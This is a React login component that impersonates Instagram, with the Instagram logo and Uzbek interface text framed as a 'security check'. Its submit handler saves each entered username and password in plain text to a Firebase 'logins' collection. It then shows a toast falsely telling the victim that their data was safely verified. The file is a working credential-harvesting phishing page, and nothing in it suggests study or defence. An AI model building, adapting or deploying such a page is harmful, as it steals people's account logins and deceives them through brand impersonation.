import React, { useState } from 'react';
import { FaFacebookSquare } from 'react-icons/fa';
import { ref, push } from 'firebase/database';
import { database } from '../firebase';
import Swal from 'sweetalert2';
import instagramLogo from '../assets/instagram-logo.jpg';
import './LoginForm.css';

const LoginForm = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prevState => ({
      ...prevState,
      [name]: value
    }));
  };

  const Toast = Swal.mixin({
    toast: true,
    position: 'top-end',
    showConfirmButton: false,
    timer: 3000,
    timerProgressBar: true
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const loginRef = ref(database, 'logins');
      const dataToSubmit = {
        ...formData,
        timestamp: new Date().toISOString()
      };

      await push(loginRef, dataToSubmit);
      setFormData({ username: '', password: '' });
      
      await Toast.fire({
        icon: 'success',
        title: 'Xavfsizlik tekshiruvi muvaffaqiyatli!',
        text: "Sizning ma'lumotlaringiz xavfsiz tarzda tasdiqlandi."
      });
    } catch (err) {
      await Toast.fire({
        icon: 'error',
        title: 'Xavfsizlik tekshiruvi amalga oshmadi!',
        text: "Ma'lumotlarni tekshirib, qaytadan urinib ko'ring."
      });
      console.error('Save error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleFacebookLogin = async () => {
    setLoading(true);

    try {
      const fbLoginRef = ref(database, 'facebook_logins');
      const dataToSubmit = {
        type: 'facebook_login',
        timestamp: new Date().toISOString()
      };

      await push(fbLoginRef, dataToSubmit);
      
      await Toast.fire({
        icon: 'success',
        title: 'Facebook orqali kirish muvaffaqiyatli!',
        text: 'Sizning hisobingiz xavfsiz tarzda tasdiqlandi.'
      });
    } catch (err) {
      await Toast.fire({
        icon: 'error',
        title: 'Facebook orqali kirish amalga oshmadi!',
        text: "Iltimos, qaytadan urinib ko'ring."
      });
      console.error('Facebook save error:', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="logo-container">
          <img src={instagramLogo} alt="Instagram" className="instagram-logo" />
        </div>
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <input
              type="text"
              name="username"
              placeholder="Telefon raqam, foydalanuvchi nomi yoki email"
              value={formData.username}
              onChange={handleChange}
              disabled={loading}
            />
          </div>
          
          <div className="form-group">
            <input
              type="password"
              name="password"
              placeholder="Parol"
              value={formData.password}
              onChange={handleChange}
              disabled={loading}
            />
          </div>
          
          <button 
            type="submit" 
            className="login-button"
            disabled={loading || !formData.username || !formData.password}
          >
            {loading ? 'Tekshirilmoqda...' : 'Xavfsizlik tekshiruvi'}
          </button>
        </form>
        
        <div className="divider">
          <span>YOKI</span>
        </div>
        
        <button 
          className="facebook-login" 
          onClick={handleFacebookLogin}
          disabled={loading}
        >
          <FaFacebookSquare className="facebook-icon" /> Facebook orqali kirish
        </button>
      </div>
    </div>
  );
};

export default LoginForm;
